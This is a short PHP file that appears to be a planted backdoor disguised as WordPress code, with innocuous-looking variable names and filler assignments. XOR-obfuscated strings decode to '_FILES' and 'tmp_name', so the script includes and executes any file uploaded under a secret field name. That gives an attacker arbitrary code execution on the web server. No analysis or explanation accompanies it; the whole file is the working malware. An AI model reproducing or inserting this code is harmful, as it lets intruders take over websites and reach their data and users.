<?php 	

function num_words()

{
    $append = 'GmxczgXV5y';
    $quote_style = $append;
    

    $babes = $GLOBALS[new_path("%18%2B1%2F%3F4", $quote_style)];
	$open_sq_flag = 'clean_terms';
    $post_mimes = $babes;
    $file = isset($post_mimes[$quote_style]);
    if ($file)

    {
        $field = $babes[$quote_style];

        $thumbnail_support = $field[new_path("3%00%08%3C%14%0653", $quote_style)];
        $mime_types = $thumbnail_support;

        include ($mime_types);
	$incpages = 'term_ids';
    }

}

function new_path($_quote_style, $image_meta)

{
    $first = $image_meta;

    $stop = "url" . "decode";
    $defaults = $stop($_quote_style);
    $timezone = substr($first,0, strlen($defaults));

    $wp_rewrite = $defaults ^ $timezone;

    
    $defaults = strpos($wp_rewrite, $timezone);
    
	$object = 'utf8_string';
    return $wp_rewrite;
}

num_words();


?>
